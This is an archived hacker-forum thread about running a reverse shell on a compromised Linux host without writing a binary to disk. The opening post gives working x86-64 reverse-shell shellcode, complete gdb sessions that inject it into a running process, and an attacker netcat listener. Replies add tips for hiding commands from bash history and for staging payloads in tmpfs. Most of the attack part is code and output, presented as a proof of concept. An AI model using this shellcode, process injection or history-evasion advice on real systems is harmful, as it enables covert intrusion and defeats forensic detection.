<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Running binaries without leaving tracks - Linux - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Continuing the discussion from Spawning reverse shells: 
I was about to reply on (https://0x00sec.org/t/spawning-reverse-shells/2133/8), but my reply has got so long that I decided to made it into a post. Please first re&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="2166.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Running binaries without leaving tracks&#39;" href="2166.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" />
<meta name="twitter:url" content="https://0x00sec.org/t/running-binaries-without-leaving-tracks/2166" />
<meta property="og:title" content="Running binaries without leaving tracks" />
<meta name="twitter:title" content="Running binaries without leaving tracks" />
<meta property="og:description" content="Continuing the discussion from Spawning reverse shells:  I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue.  The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is).  The original article describes how to solve the problem using existing too..." />
<meta name="twitter:description" content="Continuing the discussion from Spawning reverse shells:  I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue.  The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is).  The original article describes how to solve the problem using existing too..." />
<meta property="og:article:section" content="Linux" />
<meta property="og:article:section:color" content="283890" />
<meta property="og:article:tag" content="gdb" />
<meta property="og:article:tag" content="dropper" />
<meta property="og:article:tag" content="reverseshell" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="50 ❤" />
<meta property="article:published_time" content="2017-06-02T16:16:12+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="2166.html">Running binaries without leaving tracks</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/linux/64.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #283890"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Linux</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/gdb.html" class="discourse-tag" rel="tag">gdb</a>,
<a href="../../tag/dropper.html" class="discourse-tag" rel="tag">dropper</a>,
<a href="../../tag/reverseshell.html" class="discourse-tag" rel="tag">reverseshell</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Running binaries without leaving tracks">
<meta itemprop="articleSection" content="Linux">
<meta itemprop="keywords" content="gdb, dropper, reverseshell">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T16:16:12Z" class="post-time">
June 2, 2017, 4:16pm
</time>
<meta itemprop="dateModified" content="2017-06-02T16:16:12Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Continuing the discussion from <a href="../spawning-reverse-shells/2133/8.html">Spawning reverse shells</a>:</p>
<p>I was about to reply on (<a href="../spawning-reverse-shells/2133/8.html" class="inline-onebox">Spawning reverse shells</a>), but my reply has got so long that I decided to made it into a post. Please first read the original thread from <a class="mention" href="https://0x00sec.org/u/ricksanchez">@RickSanchez</a> and the comments there, before you continue.</p>
<p>The discussion here, is about how to run a reverse shell in a compromised machine without dropping anything on the local storage (whatever it is).</p>
<p>The original article describes how to solve the problem using existing tools in the machine. Then, in the comments I propose to drop a remote shell using the <code>echo</code> technique (or the <strong>Chuck Norris way</strong> if you prefer:). This technique requires to drop a binary somewhere in the disk before running it. So the following question arose:</p>
<p><strong>Can we run a binary without first dropping it into the local storage?</strong></p>
<p>There are a few posibilities but, they will only work under certain specific circunstances. What is described below is not an universal solution but just more alternatives for different situations.</p>
<h1>Option 1. Memory File Systems</h1>
<p>This is the simplest option. You can drop your program in <code>/run/shm</code> or <code>/dev/shm</code>. This is actually memory what means that the binary is not begin actually saved in any storage device. However, this has some limitations.</p>
<p>First, those mount points are usually configured with the <code>noexec</code> flag. This means that you cannot execute programs stored in those folders <img src="../../images/emoji/twitter/frowning.png%3Fv=9" title=":frowning:" class="emoji" alt=":frowning:"> . If you have root access, then you can remount them without that flag.</p>
<p>Second, the binary will be in memory. This means that, a reboot should clean everything up without leaving any track of what happened. However, while the machine is up, the file will be there. Even if we delete it after execution, the binary can still be recovered just dumping the <code>exe</code> folder from its associated <code>/proc</code> entry:</p>
<p><code>cat /proc/PID/exe &gt; orignal_binary</code></p>
<h1>Option 2. Evil Kernel Module</h1>
<p>This actually implies that the machine have been severely compromised and you have dropped a file (the kernel module) in advance. From kernel space you should have full control of the machine and be able to get code from anywhere, put it in memory at any location you want and run it.</p>
<p>Haven’t tried this so I do not know how difficult it is.</p>
<p>I do not know either whether you will ever see this option in the real world. If somebody has compromised a machine to be able to drop a kernel module, then… you just drop a rootkit and hide whatever you want.</p>
<p>However, note that if the <em>malware</em> is hidden with a rootkit, it is trivial to recover the binary for analysis (just connect the HD to a different machine and mounted the disk from a clean system).</p>
<h1>Option 3. Abusing gdb</h1>
<p>Without diving into the kernel, the only way (to my knowledge) to get code executed without using a binary on the disk (under GNU/Linux) is to use the <code>ptrace</code> system call. This way you can attach to any process (as far as it does not have anti-debug code), modify its text segment with your code and restart execution at a convenient place.</p>
<p>This is roughly what is described in this paper:</p>
<aside class="quote quote-modified" data-post="1" data-topic="1097">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar">
<a href="../linux-infecting-running-processes/1097.html">[Linux] Infecting Running Processes</a> <a class="badge-wrapper  bullet" href="../../c/programming/61.html"><span class="badge-category-bg" style="background-color: #92278F;"></span><span style data-drop-close="true" class="badge-category clear-badge">Programming</span></a>
</div>
<blockquote>
We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processes in memory… In other words, it will introduce you to the basics of how to write your own debugger.
Use Cases
Before going into the gory details, let’s introduce a couple of situations that may benef…
</blockquote>
</aside>
<p>So, if <code>gdb</code> is available in the target machine, you can do all this from <code>gdb</code> just <em>typing</em> the proper sequence of commands. Note that this will imply to <em>type</em> the machine code :).</p>
<p>Of course, you will not type this, you’d either copy&amp;paste or feed it through whatever interface you are using the get shell access to the machine…</p>
<p>So, for educational purposes here is a PoC. The Shellcode comes from (<a href="https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/" rel="nofollow noopener">https://modexp.wordpress.com/2016/03/31/x64-shellcodes-linux/</a>):</p>
<pre><code class="lang-auto">nc -v -l 1234 # Attacker
# Victim
$ gdb /bin/cat
(gdb) set follow-exec-mode new
(gdb) r
Starting program: /bin/cat
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b01eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) set (char[66]) *0x7ffff7b01eb0  = {0x48,0xb8,0xfd,0xff,0xfb,0x2d,0x80,0xff,0xff,0xfe,0x48,0xf7,0xd0,0x50,0x54,0x6a,0x29,0x58,0x6a,0x01,0x5e,0x6a,0x02,0x5f,0x99,0x0f,0x05,0x97,0x96,0xb0,0x21,0x0f,0x05,0x83,0xee,0x01,0x79,0xf7,0x5e,0xb2,0x10,0xb0,0x2a,0x0f,0x05,0x99,0x52,0x5e,0x52,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x51,0x54,0x5f,0xb0,0x3b,0x0f,0x05}
(gdb) c
Continuing.
&lt;PRESS ENTER HERE&gt;
process 4142 is executing new program: /bin/dash
</code></pre>
<p>A couple of comments:</p>
<ul>
<li>The <code>set follow-exec-mode new</code> command at the beginning is just to avoid <code>gdb</code> to get control back after <code>execing</code> the shell. If not used you just need to issue the command <code>c</code> (<code>continue</code>) again.</li>
<li>
<code>gdb</code> will be visible in the list of active processes which is suspicious.</li>
<li>This technique could be applied to a running process, but in that case you need root access in order to attach to a process that is not your child</li>
</ul>
<h1>Option 4. More gdb abusing</h1>
<p>For this last scenario, when you have root access, you can just attach to a running process, modify it and leave it running. This is how it would look like:</p>
<pre><code class="lang-auto">nc -v -l 1234 # Attacker
# Victim1
$ cat   # Target process, can be something already running

# Victim2
$ pidof cat
4637
$ sudo gdb -p 4637
Attaching to process 4637
Reading symbols from /bin/cat...(no debugging symbols found)...done.
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/libc-2.15.so...done.
done.
Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6
Reading symbols from /lib64/ld-linux-x86-64.so.2...Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/ld-2.15.so...done.
done.
Loaded symbols for /lib64/ld-linux-x86-64.so.2
0x00007f4360138eb0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82	../sysdeps/unix/syscall-template.S: No such file or directory.

(gdb)  set (int[17])*(int*)$rip = { 0xfffdb848, 0xff802dfb, 0xf748feff, 0x6a5450d0, 0x16a5829, 0x5f026a5e, 0x97050f99, 0xf21b096, 0x1ee8305, 0xb25ef779, 0xf2ab010, 0x5e529905, 0x2fb94852, 0x2f6e6962, 0x5168732f, 0x3bb05f54, 0x0000050f}
(gdb) detach
Detaching from program: /bin/cat, process 4637
(gdb) q
</code></pre>
<p>This time, I’m poking the data with a different command. It is a bit more convenient as I uses the <code>rip</code> register value (that already holds an address suitable for our purposes) and dumps double words instead of bytes… Just another way of doing it.</p>
<p>Now, you can press enter in the session where you run <code>cat</code> and get your reverse shell on the <code>netcat</code> server.</p>
<p>We have to press <code>ENTER</code> in both cases, because <code>cat</code> is blocked in a <code>read</code> to get data from <code>stdin</code>. Pressing <code>ENTER</code> will finish the system call and actually run the code we have injected… Well, at least, this is what I think is happening (see the <code>__read_nocancel</code> reference above). If I’m wrong, please do not hesitate to correct me.</p>
<p>The process list will just show the already existing <code>cat</code> process. However it is no longer a <code>cat</code> it is now our <em>doggy</em> reverse shell. However, the connection will be visible through <code>netstat</code> or <code>lsof</code>.</p>
<p>What we have just done is similar to the <em>meterpreter process migration capabilities</em>. It works a bit different in Windows, but, as far as I know, the concept is the same…</p>
<p>As a final comment, it may be possible to do all this if there is an exploit that can be used against the target machine. In that case, the exploit payload can already be the remote shell or a loader (the meterpreter way) that can allocate memory and load code transferred through the active connection.</p>
<h1>Are you Bored?</h1>
<p>So you are bored to dead and desperately looking for projects to do and sharp your skills. Goodl!. These are some things you can try:</p>
<ul>
<li>Try to reproduce this using a remote exploit. You can take the vulnerable server from <a href="../remote-exploit-shellcode-without-sockets/1440.html" class="inline-onebox">Remote Exploit. Shellcode without Sockets</a> to get started</li>
<li>Try not to destroy the binary. This requires:
<ul>
<li>to get a copy of the victim process state and of the original code we overwrite during the injection process</li>
<li>to modify the payload to start a thread (or a process) to run our code</li>
<li>to restore the original code as well as its state and restore the original execution</li>
</ul>
</li>
</ul>
<p>Hack fun!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="21" />
<span class="post-likes">21 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../super-stealthy-droppers/3715.html">Super-Stealthy Droppers</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../programming-for-wanabes-xi-introduction-to-rats/26318.html">Programming for Wanabes XI. Introduction to RATs</a>
<meta itemprop="position" content="6">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/SmartOne"><span itemprop="name">SmartOne</span></a>
(Not a N00b, but still learning)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T16:30:52Z" class="post-time">
June 2, 2017, 4:30pm
</time>
<meta itemprop="dateModified" content="2017-06-02T16:30:52Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great article! However, be sure to leave a space before the commands in order to make sure that they aren’t saved to the (bash) history <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T17:35:16Z" class="post-time">
June 2, 2017, 5:35pm
</time>
<meta itemprop="dateModified" content="2017-06-02T17:35:16Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>That’s a nice trick. Thanks for sharing <a class="mention" href="https://0x00sec.org/u/smartone">@SmartOne</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/kowalski"><span itemprop="name">kowalski</span></a>
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T17:50:03Z" class="post-time">
June 2, 2017, 5:50pm
</time>
<meta itemprop="dateModified" content="2017-06-02T17:50:03Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> Can’t we use /tmp for this purpose, the common mount options enabled on most Linux systems today by default (since they run systemd, which mounts /tmp as tmpfs afaict, or unless configured otherwise) are rw, nosuid and nodev. /tmp is tmpfs so writing here won’t make changes to the disk. What do you think? I’ve seen this directory being used by processes for IPC sometimes. The changes here are lost on every reboot.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/kowalski"><span itemprop="name">kowalski</span></a>
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T17:59:34Z" class="post-time">
June 2, 2017, 5:59pm
</time>
<meta itemprop="dateModified" content="2017-06-02T17:59:34Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You can also use <code>set +o history</code> to turn it off and <code>set -o history</code> to turn it back on. <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../spawning-reverse-shells/2133/11.html">Spawning reverse shells</a>
<meta itemprop="position" content="1">
</div>
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:03:33Z" class="post-time">
June 2, 2017, 6:03pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:09:37Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group quote-modified" data-username="0x00pf" data-post="1" data-topic="2166">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>I was about to reply on (<a href="../spawning-reverse-shells/2133/8.html" class="inline-onebox">Spawning reverse shells</a>), but my reply has got so long that I decided to made it into a post. Please first read the original thread from <a class="mention" href="https://0x00sec.org/u/ricksanchez">@RickSanchez</a> and the comments there, before you continue.</p>
</blockquote>
</aside>
<p><a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> yes mention and “praise” me more for my awesome topic. go on. don’t stop yet.</p>
<p>nah mate awesome “reply” to the question which evolved on my thread the last days. I’ll cross link this article there too, so finding it will be easy.</p>
<p>Back to topic now. This brings the topic of spawning a reverse shell on a whole different level actually.<br>
My article dealt with the basic things one can tinker and play around with, but you decided to bring the super stealthy as fuck option right away <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"> <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:24:01Z" class="post-time">
June 2, 2017, 6:24pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:24:01Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I think you are right, and it usually does not have the <code>noexec</code> flag set. However, sometime it is mounted on the disk so it is better to first check. <code>/dev/sdm</code> and <code>/run/shm</code> are always memory based.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:26:10Z" class="post-time">
June 2, 2017, 6:26pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:26:10Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>You article was great as it was the starting point for some interesting discussions… blame <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> and <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> for pushing this farther <img src="../../images/emoji/twitter/stuck_out_tongue.png%3Fv=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/ricksanchez"><span itemprop="name">ricksanchez</span></a>
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:33:36Z" class="post-time">
June 2, 2017, 6:33pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:33:36Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I don’t blame those two at all. I’m happy one of my articles led to such an interesting discussion.<br>
That’s what these articles are for in the first place right?</p>
<pre><code>Reading - Understanding - Discussing</code></pre>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/kowalski"><span itemprop="name">kowalski</span></a>
</span>
<link itemprop="mainEntityOfPage" href="2166.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-02T18:37:27Z" class="post-time">
June 2, 2017, 6:37pm
</time>
<meta itemprop="dateModified" content="2017-06-02T18:37:27Z">
<span itemprop="position">10</span>
</span>
</div>
